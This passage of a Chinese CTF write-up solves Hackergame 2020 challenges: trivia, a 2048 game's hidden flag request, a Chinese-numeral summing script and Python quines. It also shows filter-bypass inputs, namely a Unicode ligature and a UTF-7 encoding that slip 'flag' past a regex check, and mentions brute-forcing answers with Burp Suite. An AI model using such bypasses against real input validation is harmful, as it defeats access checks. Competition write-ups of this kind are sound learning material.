个。（详见后面）</p></li></ol><ol start="2"><li><p>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</p><p>这个题真的有意思。最开始还以为是很常见的 1500 bytes，或者 PPPOE 的1492bytes，但都不对。</p><p>于是真就去找了，没想到真有禽类作为标准这一说。</p><p><a href="https://baike.baidu.com/item/%E4%BF%A1%E9%B8%BDIP%E9%80%9A%E8%AE%AF/7013924?fr=aladdin" target="_blank" rel="noopener">百度百科：信鸽IP通讯</a></p><p><strong>“禽类作为载体传输IP数据包标准”</strong></p><p>详见 <a href="http://www.faqs.org/rfcs/rfc1149.html" target="_blank" rel="noopener">RFC 1149 - Standard for the transmission of IP datagrams on avia</a>。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023000333.png" alt="MTU"></p><p>得到其 MTU 为 256 毫克。绝了！</p><blockquote><p>BTW, 顺便查到了 常见的 MTU 标准。</p><p>详见 <a href="https://tools.ietf.org/html/rfc1191" target="_blank" rel="noopener">RFC 1191: Path MTU Discovery</a>。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023622367.png" alt="Common MTUs in the Internet"></p></blockquote></li></ol><ol start="3"><li><p>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</p><p><a href="https://lug.ustc.edu.cn/wiki/lug/events/" target="_blank" rel="noopener">https://lug.ustc.edu.cn/wiki/lug/events/</a></p><p><a href="https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf" target="_blank" rel="noopener">https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2019.09.21_SFD/slides/%E9%97%AA%E7%94%B5%E6%BC%94%E8%AE%B2/Teeworlds/teeworlds.pdf</a></p><p>TEEWORLDS</p><p>9</p></li></ol><ol start="4"><li><p>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</p><p><a href="https://map.baidu.com/poi/%E4%B8%AD%E5%9B%BD%E7%A7%91%E5%AD%A6%E6%8A%80%E6%9C%AF%E5%A4%A7%E5%AD%A6(%E8%A5%BF%E6%A0%A1%E5%8C%BA)/@13053819.58,3720218.68,21z,87t,-84.8h?uid=f55a47578c94cfb15cd4fef9&amp;ugc_type=3&amp;ugc_ver=1&amp;device_ratio=2&amp;compat=1&amp;querytype=detailConInfo&amp;da_src=shareurl#panoid=09010500121705221534309496D&amp;panotype=street&amp;heading=336.61&amp;pitch=-19.46&amp;l=21&amp;tn=B_NORMAL_MAP&amp;sc=0&amp;newmap=1&amp;shareurl=1&amp;pid=09010500121705221534309496D" target="_blank" rel="noopener">百度实景地图</a> 好啊！</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101020104659.png" alt="baidu map"></p><p>9</p></li></ol><ol start="5"><li><p>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</p><p>参考 <a href="https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/" target="_blank" rel="noopener">https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/</a></p><blockquote><p>经统计，在本次比赛中，总共有 2682 人注册，1904 人至少完成了一题。比赛期间所有人合计提交了 17098 次 flag，其中约 57.44% 为正确的提交。</p></blockquote><p>17098 </p></li></ol><p>抓了个包拿去 Burp Suite 暴力解第一题答案<em>（大雾</em></p><p>最后得到 flag。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201101023338503.png" alt="flag"></p><hr><h2 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h2><p>好一个翻版的2048，然而真正要到 2^14 才行（</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161235179.png" alt=""></p><p>玩了几局发现玩不下去了，直接看源码好了吧。</p><p>关键的源码在 <code>html_actuator.js</code> 最后这一段。</p><pre class=" language-javascript"><code class="language-javascript">HTMLActuator<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>message <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>won<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> type    <span class="token operator">=</span> won <span class="token operator">?</span> <span class="token string">"game-won"</span> <span class="token punctuation">:</span> <span class="token string">"game-over"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> message <span class="token operator">=</span> won <span class="token operator">?</span> <span class="token string">"FLXG 大成功！"</span> <span class="token punctuation">:</span> <span class="token string">"FLXG 永不放弃！"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> url<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>won<span class="token punctuation">)</span> <span class="token punctuation">{</span>        url <span class="token operator">=</span> <span class="token string">"/getflxg?my_favorite_fruit="</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">+</span> <span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        url <span class="token operator">=</span> <span class="token string">"/getflxg?my_favorite_fruit="</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">let</span> request <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'text'</span><span class="token punctuation">;</span>    request<span class="token punctuation">.</span>onload <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"game-message-extra"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> request<span class="token punctuation">.</span>response<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>其中</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161459047.png" alt="banana"></p><p><code>NaN</code> 拼接可还行，JS 真奇妙。</p><p>于是构造请求 </p><p><a href="http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana" target="_blank" rel="noopener">http://202.38.93.111:10005/getflxg?my_favorite_fruit=banana</a></p><p>即可拿到 flag 了！</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161551356.png" alt="flag"></p><hr><h2 id="一闪而过的-Flag"><a href="#一闪而过的-Flag" class="headerlink" title="一闪而过的 Flag"></a>一闪而过的 Flag</h2><p>在命令行里打开就完事了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161713760.png" alt="flag"></p><hr><h2 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h2><blockquote><p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p><p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p><p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p><p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p></blockquote><p>发现是个 excel。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031161905992.png" alt="excel"></p><p>总共有1000行数据，本来想在里面直接转换的，但试了一下发现没找到自带的工具，于是用 Python 写个脚本算算好了。</p><p>首先用正则匹配先把元、角、分给提取出来，然后写个字典转换就好了。</p><p>这里的转换参考了 <a href="https://www.cnblogs.com/tanrong/p/10434172.html" target="_blank" rel="noopener">Python 中文(大写)数字转阿拉伯数字</a>，在此基础上结合这题改了改代码。</p><p>另外考虑到浮点运算可能带来的精度问题，元、角、分单独统计，最后进行合并。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""Hackergame 2020从零开始的记账工具人@Author: MiaoTony@Time: 20201031"""</span><span class="token comment" spellcheck="true"># constants for chinese_to_arabic</span>CN_NUM <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'〇'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'一'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'二'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'三'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'四'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'五'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'六'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'七'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'八'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'九'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'零'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>    <span class="token string">'壹'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'贰'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'叁'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'肆'</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'伍'</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'陆'</span><span class="token punctuation">:</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token string">'柒'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'捌'</span><span class="token punctuation">:</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'玖'</span><span class="token punctuation">:</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token string">'貮'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'两'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">}</span>CN_UNIT <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'十'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    <span class="token string">'拾'</span><span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">,</span>    <span class="token string">'百'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    <span class="token string">'佰'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>    <span class="token string">'千'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>    <span class="token string">'仟'</span><span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>    <span class="token string">'万'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>    <span class="token string">'萬'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span>    <span class="token string">'亿'</span><span class="token punctuation">:</span> <span class="token number">100000000</span><span class="token punctuation">,</span>    <span class="token string">'億'</span><span class="token punctuation">:</span> <span class="token number">100000000</span><span class="token punctuation">,</span>    <span class="token string">'兆'</span><span class="token punctuation">:</span> <span class="token number">1000000000000</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">chinese_to_arabic</span><span class="token punctuation">(</span>cn<span class="token punctuation">:</span> str<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> int<span class="token punctuation">:</span>    unit <span class="token operator">=</span> <span class="token number">0</span>   <span class="token comment" spellcheck="true"># current</span>    ldig <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># digest</span>    <span class="token keyword">for</span> cndig <span class="token keyword">in</span> reversed<span class="token punctuation">(</span>cn<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> cndig <span class="token keyword">in</span> CN_UNIT<span class="token punctuation">:</span>            unit <span class="token operator">=</span> CN_UNIT<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cndig<span class="token punctuation">)</span>            <span class="token keyword">if</span> unit <span class="token operator">==</span> <span class="token number">10000</span> <span class="token operator">or</span> unit <span class="token operator">==</span> <span class="token number">100000000</span><span class="token punctuation">:</span>                ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span>unit<span class="token punctuation">)</span>                unit <span class="token operator">=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            dig <span class="token operator">=</span> CN_NUM<span class="token punctuation">.</span>get<span class="token punctuation">(</span>cndig<span class="token punctuation">)</span>            <span class="token keyword">if</span> unit<span class="token punctuation">:</span>                dig <span class="token operator">*=</span> unit                unit <span class="token operator">=</span> <span class="token number">0</span>            ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dig<span class="token punctuation">)</span>    <span class="token keyword">if</span> unit <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        ldig<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    val<span class="token punctuation">,</span> tmp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> reversed<span class="token punctuation">(</span>ldig<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> x <span class="token operator">==</span> <span class="token number">10000</span> <span class="token operator">or</span> x <span class="token operator">==</span> <span class="token number">100000000</span><span class="token punctuation">:</span>            val <span class="token operator">+=</span> tmp <span class="token operator">*</span> x            tmp <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp <span class="token operator">+=</span> x    val <span class="token operator">+=</span> tmp    <span class="token keyword">return</span> val<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""贰拾元陆角伍分    1    壹元壹角贰分    4    拾捌元伍角壹分    1    ...    """</span>    l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(len(l))</span>    re_split <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'(.*元)?(.*角)?(.*分)?'</span><span class="token punctuation">)</span>    total_yuan <span class="token operator">=</span> <span class="token number">0</span>    total_jiao <span class="token operator">=</span> <span class="token number">0</span>    total_fen <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> l<span class="token punctuation">:</span>        yuan_int <span class="token operator">=</span> <span class="token number">0</span>        jiao_int <span class="token operator">=</span> <span class="token number">0</span>        fen_int <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>        money <span class="token operator">=</span> row<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        count <span class="token operator">=</span> row<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        count_int <span class="token operator">=</span> int<span class="token punctuation">(</span>count<span class="token punctuation">)</span>        money_group <span class="token operator">=</span> re_split<span class="token punctuation">.</span>search<span class="token punctuation">(</span>money<span class="token punctuation">)</span>        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yuan <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            yuan_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>yuan<span class="token punctuation">)</span>        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            jiao <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            jiao_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>jiao<span class="token punctuation">)</span>        <span class="token keyword">if</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            fen <span class="token operator">=</span> money_group<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            fen_int <span class="token operator">=</span> chinese_to_arabic<span class="token punctuation">(</span>fen<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>yuan_int<span class="token punctuation">,</span> jiao_int<span class="token punctuation">,</span> fen_int<span class="token punctuation">)</span>        total_yuan <span class="token operator">+=</span> yuan_int <span class="token operator">*</span> count_int        total_jiao <span class="token operator">+=</span> jiao_int <span class="token operator">*</span> count_int        total_fen <span class="token operator">+=</span> fen_int <span class="token operator">*</span> count_int    total <span class="token operator">=</span> total_yuan <span class="token operator">+</span> total_jiao <span class="token operator">*</span> <span class="token number">0.1</span> <span class="token operator">+</span> total_fen <span class="token operator">*</span> <span class="token number">0.01</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"total:"</span><span class="token punctuation">,</span> total<span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201031162456877.png" alt="results"></p><p>所以就是 </p><p><code>flag{20132.81}</code></p><blockquote><p>后面才知道，这题居然是动态 flag，也就是说动态生成的文件。出题师傅们太强了！</p><p>BTW，还发现了一个好用的库 <strong><a href="https://github.com/Ailln/cn2an" target="_blank" rel="noopener">cn2an</a></strong>。</p><blockquote><p>📦 快速转化「中文数字」和「阿拉伯数字」～ (最新特性：分数，日期、温度等转化）    </p></blockquote></blockquote><hr><h2 id="自复读的复读机"><a href="#自复读的复读机" class="headerlink" title="自复读的复读机"></a>自复读的复读机</h2><blockquote><p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p><ul><li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li><li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li></ul><p>满足两个条件分别对应了两个 flag。</p></blockquote><p>参考：</p><p><a href="https://en.wikipedia.org/wiki/Quine_(computing)" target="_blank" rel="noopener">Wikipedia: Quine (computing)</a></p><p><a href="https://zhuanlan.zhihu.com/p/125114823" target="_blank" rel="noopener">B乎：如何编写一个打印自身源代码的程序</a></p><blockquote><p>在Python中有一个 <code>%r</code>，它的意思就是调用对象的 <code>repr()</code> 方法后替换本身在字符串中的位置，对于字符串对象，会保留其本身的引号（这点在我们实现 Quine 的时候会减少很多麻烦）。</p></blockquote><h3 id="输出代码本身的逆序"><a href="#输出代码本身的逆序" class="headerlink" title="输出代码本身的逆序"></a>输出代码本身的逆序</h3><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"s = %r;print(''.join(reversed(s %% s)),end='')"</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>reversed<span class="token punctuation">(</span>s <span class="token operator">%</span> s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102182322408.png" alt="flag"></p><p>BTW，这个题本来想在 VPS 上搭个接口直接返回的逆向的字符串，不过发现这个机器好像不通外网于是不行？</p><p>BTW，这个<code>exec()</code>可以直接读源码但不能读 flag，2333. 原因是用了 subprocess 以 nobody 用户去执行脚本，而 flag 放在了 /root 目录下。</p><h3 id="输出代码本身的-sha256-哈希值"><a href="#输出代码本身的-sha256-哈希值" class="headerlink" title="输出代码本身的 sha256 哈希值"></a>输出代码本身的 sha256 哈希值</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token punctuation">;</span>m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token operator">=</span><span class="token string">"import hashlib;m=hashlib.sha256();s=%r;m.update((s %% s).encode());print(m.hexdigest(),end='')"</span><span class="token punctuation">;</span>m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">%</span> s<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201102182511614.png" alt="flag"></p><hr><h2 id="233-同学的字符串工具"><a href="#233-同学的字符串工具" class="headerlink" title="233 同学的字符串工具"></a>233 同学的字符串工具</h2><p>题目所给关键代码如下。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">to_upper</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">'[fF][lL][aA][gG]'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>match<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'how dare you'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'FLAG'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes, I will give you the flag'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'/flag1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> s<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">to_utf8</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">'[fF][lL][aA][gG]'</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># make it bytes</span>    <span class="token keyword">if</span> r<span class="token punctuation">.</span>match<span class="token punctuation">(</span>s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'how dare you'</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'yes, I will give you the flag'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token string">'/flag2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="字符串大写工具"><a href="#字符串大写工具" class="headerlink" title="字符串大写工具"></a><strong><strong>字符串大写工具</strong></strong></h3><p>得看看啥字符经过 <code>upper</code> 方法出来就是 <code>flag</code> 或者其中某个字符。</p><p>这里就硬是跑出来的。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    char <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'f'</span> <span class="token keyword">in</span> char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token string">'F'</span> <span class="token keyword">in</span> char<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ﬂ'</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span><span class="token string">'ﬂ'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103155334679.png" alt="求解字符"></p><p><strong>payload:</strong></p><p><code>ﬂag</code></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103014034671.png" alt="flag1"></p><p><code>flag{badunic0debadbad_xxxxxxxx}</code></p><p>Unicode 太奇妙了！据说这叫做 <strong>unicode 字符折叠/合字</strong>（？）</p><blockquote><p>Extensive Reading:</p><p><a href="https://blog.csdn.net/csdnnews/article/details/103516231" target="_blank" rel="noopener">CSDN: 了不起的 Unicode！</a></p></blockquote><h3 id="UTF-7-到-UTF-8-转换工具"><a href="#UTF-7-到-UTF-8-转换工具" class="headerlink" title="UTF-7 到 UTF-8 转换工具"></a>UTF-7 到 UTF-8 转换工具</h3><p><code>s.encode()</code>和 <code>decode()</code> 默认用的 utf-8 编码，这里用 utf-7 编码再用 utf-7 解码就能吐 flag 了。</p><p>最开始用 Python 的 <code>'flag'.encode('utf-7')</code> 方法，发现出来结果就是 <code>b'flag'</code>，傻了。</p><p>之后去查了 <a href="https://zh.wikipedia.org/wiki/UTF-7" target="_blank" rel="noopener">UTF-7 的维基百科</a>，决定自己按照编码流程走一遍吧。</p><p>（没注意是 <strong>UTF-16 大端序</strong>，我试了半天发现最后是大小端的问题，人傻了。</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201103011526169.png" alt="编码方法"></p><p>首先将 <code>flag</code> 转换为 UTF-16(BE) (1201)，即下面的 <code>x</code>。</p><p>而后每六位一组进行 base64 编码，这里直接用 base64 模块的方法了。</p><p>最后去掉末尾的 <code>=</code>，在最前面加上 <code>+</code>，即可得到 UTF-7 编码。</p><pre class=" language-python"><code class="language-python">x <span class="token operator">=</span> b<span class="token string">'\x00\x66\x00\x6c\x00\x61\x00\x67'</span>y <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># b'AGYAbABhAGc='</span>b<span class="token string">'+AGYAbABhAGc='</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-7'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 